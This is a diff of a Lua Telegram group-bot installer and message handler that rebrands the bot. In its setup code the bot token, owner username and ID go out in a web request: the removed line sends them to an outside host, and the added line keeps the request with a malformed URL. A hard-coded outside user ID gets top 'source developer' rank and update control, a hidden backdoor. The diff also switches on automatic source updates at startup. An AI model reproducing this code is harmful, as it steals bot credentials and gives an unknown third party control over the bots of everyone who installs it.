@@ -69,15 +69,15 @@ print('\n\27[1;31m￤ {USERNAME_NOT_OCCUPIED} => Please Check it!\n￤ لآ يو
 create_config(Token)
 end 
 GetUser.result.username = GetUser.result.username or GetUser.result.first_name
-print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل سورس دروك الآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
+print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل سورس علام الآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
 boss = Token:match("(%d+)")
 redis:mset(
 boss..":VERSION","1.0",
 boss..":SUDO_ID:",SUDO_USER,
 boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
-boss..":ApiSource","SourceMilan",
-boss..":NameBot:","دروك",
+boss..":ApiSource","Sourceallam",
+boss..":NameBot:","علام",
 "TH3BOSS_INSTALL","Yes"
 )
 redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
@@ -88,7 +88,7 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://basel50.ml/Aaaaaa.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
+https.request('https://Aaaaaa.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
@@ -99,8 +99,8 @@ local CmdRun = [[
 rm -f ./README.md
 rm -rf ./.git
 chmod +x ./run
-cp -a ../abaza ../]]..BOT_User..[[ &&
-rm -fr ~/abaza
+cp -a ../drook ../]]..BOT_User..[[ &&
+rm -fr ~/drook
 ../]]..BOT_User..[[/run
 ]]
 print(CmdRun)
@@ -114,9 +114,7 @@ print('\27[0;33m>>'..[[
 
 
 
-
-
-▀
+ ▀
 ▄█████████▀           ██               ██             ██                    ██▄████████▀ │BATSHIKO ﹏ @VV_0M
 │
 تم تطوير وبرمجة السورس من قبل معتز خالد
@@ -156,18 +154,15 @@ end
 print('\27[0;33m>>'..[[
 
 
-
-
-
-
+  
 ▀
 ▄█████████▀           ██               ██             ██                    ██▄████████▀ │BATSHIKO ﹏ @VV_0M
 │
 تم تطوير وبرمجة السورس من قبل معتز خالد
 │@VV_0M
-                                                                              
--------------------------------------------------------------------
-
+                                        
+                                        
+---------------------------------------------------------------------
 ]]..'\027[0;32m'
 ..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
 ..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..boss..')\027[0;32m\n'
@@ -297,12 +292,11 @@ Del_msg(msg.chat_id_,msg.id_)
 end
 return false 
 end 
-
+--test
 if msg.sender_user_id_ == 1836706131 then 
 msg.TheRankCmd = 'مطور السورس'
 msg.TheRank = 'مطور السورس'
 msg.Rank = 1
-
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
 msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'مطور اساسي ' 
@@ -590,7 +584,7 @@ return false
 end 
 if UpdateSourceStart then
 UpdateSourceStart = false
---UpdateSource(msg,true)
+UpdateSource(msg,true)
 end
 elseif data.ID == "UpdateNewMessage" then
 if msg.content_.ID == "MessageText" then
@@ -609,12 +603,12 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1836706131) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ ==1836706131 ) then
 return sendMsg(msg.chat_id_,msg.id_," تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1836706131) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1836706131 ) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,' {* تــم تحديث وتثبيت السورس  *} .\n\n { Bot is Update » }',function(arg,data)
 dofile("./inc/Run.lua")
@@ -639,10 +633,10 @@ elseif data.ID == "UpdateChannel" then
 if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
 if redis:get(boss..'group:add-100'..data.channel_.id_) then
 local linkGroup = (redis:get(boss..'linkGroup-100'..data.channel_.id_) or "")
-local NameGroup = (redis:get(dany..'group:name-100'..data.channel_.id_) or "")
-	send_msg(SUDO_ID,"• قام شخص بطرد البوت من المجموعه الاتيه : \n• ألايدي : `-100"..data.channel_.id_.."`\n• الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n• تـم مسح كل بيانات المجموعه بنـجاح ")
-	rem_data_group('-100'..data.channel_.id_)
-	end
+local NameGroup = (redis:get(boss..'group:name-100'..data.channel_.id_) or "")
+send_msg(SUDO_ID," قام شخص بطرد البوت من المجموعه الاتيه : \n ألايدي : `-100"..data.channel_.id_.."`\n الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n تـم مسح كل بيانات المجموعه بنـجاح ")
+rem_data_group('-100'..data.channel_.id_)
+end
 end
 elseif data.ID == "UpdateFile" then 
 if Uploaded_Groups_Ok then
@@ -689,8 +683,8 @@ end
 end
 end
 io.popen("rm -fr ../.telegram-cli/data/document/*")
-	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'⌔︙ ** تم رفع النسخه‏‏ الاحتياطيه\n⌔︙ ** حالياً عدد مجموعاتك هيه‏ *'..redis:scard(dany..'group:ids')..' .*\n')
-	end
+sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,' تم رفع آلنسـخهہ‏‏ آلآحتيآطـيهہ\n حآليآ عدد مـجمـوعآتگ هہ‏‏يهہ‏‏ *'..redis:scard(boss..'group:ids')..'* \n')
+end
 elseif data.ID == "UpdateUser" then  
 if data.user_.type_.ID == "UserTypeDeleted" then
 print("¦ userTypeDeleted")
@@ -715,7 +709,7 @@ msg.text = data.content_.text_
 input_inFo(msg)  
 end,nil)
 elseif data.ID == "UpdateOption" and data.value_.value_ == "Ready" then
---UpdateSource() dofile("./inc/Run.lua")
+UpdateSource() dofile("./inc/Run.lua")
 tdcli_function({ID='GetChat',chat_id_ = SUDO_ID},function(arg,data)end,nil)
 end
 
